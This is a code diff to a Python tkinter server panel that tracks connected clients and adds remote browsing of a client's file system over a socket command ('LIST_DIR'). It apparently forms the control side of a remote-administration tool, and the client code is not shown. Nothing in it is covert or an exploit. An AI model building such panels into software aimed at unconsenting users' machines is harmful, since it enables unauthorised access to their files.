@@ -1,3 +1,4 @@
+import os
 import socket
 import threading
 import tkinter as tk
@@ -13,6 +14,8 @@ class ServerGUI:
         self.tree.heading("IP", text="IP Адрес")
         self.tree.heading("Status", text="Статус")
         self.tree.pack(fill=tk.BOTH, expand=True)
+
+        self.tree.bind("<Double-1>", self.on_double_click)
 
         self.btn_frame = tk.Frame(root)
         self.btn_frame.pack(fill=tk.X, pady=5)
@@ -38,7 +41,7 @@ class ServerGUI:
 
     def start_socket_server(self):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(('0.0.0.0', 12345))
+        server.bind(('0.0.0.0', 4000))
         server.listen(5)
 
         while True:
@@ -53,8 +56,15 @@ class ServerGUI:
     def monitor_client(self, sock, client_id):
         try:
             while True:
-                if not sock.recv(1024):
-                    break
+                data = sock.recv(1024)
+                if not data: break
+
+                decoded_data = data.decode('utf-8')
+                if decoded_data.startswith("DIR_DATA:"):
+                    raw_payload = decoded_data[9:]
+                    current_path, files_str = raw_payload.split("||")
+                    files_list = files_str.split("|")
+                    self.root.after(0, self.show_desktop_window, client_id, current_path, files_list)
         except:
             pass
         finally:
@@ -62,6 +72,37 @@ class ServerGUI:
                 del self.active_connections[client_id]
             self.update_status(client_id, "Оффлайн")
             sock.close()
+
+    def on_double_click(self, event):
+        selected = self.tree.selection()
+        if not selected: return
+        client_id = self.tree.item(selected[0])['values'][0]
+        if client_id in self.active_connections:
+            self.active_connections[client_id].send("LIST_DIR:".encode('utf-8'))
+
+    def show_desktop_window(self, client_id, current_path, files_list):
+        win = tk.Toplevel(self.root)
+        win.title(f"Проводник: {client_id}")
+        win.geometry("500x500")
+
+        lbl = tk.Label(win, text=f"Шлях: {current_path}", fg="blue")
+        lbl.pack(fill=tk.X)
+
+        listbox = tk.Listbox(win)
+        listbox.pack(fill=tk.BOTH, expand=True)
+
+        for f in files_list:
+            listbox.insert(tk.END, f)
+
+        def open_item(event):
+            selection = listbox.get(listbox.curselection())
+            if selection.startswith("[DIR] "):
+                folder_name = selection[6:]
+                new_path = os.path.join(current_path, folder_name)
+                self.active_connections[client_id].send(f"LIST_DIR:{new_path}".encode('utf-8'))
+                win.destroy()
+
+        listbox.bind("<Double-1>", open_item)
 
     def send_command(self, cmd):
         selected_item = self.tree.selection()
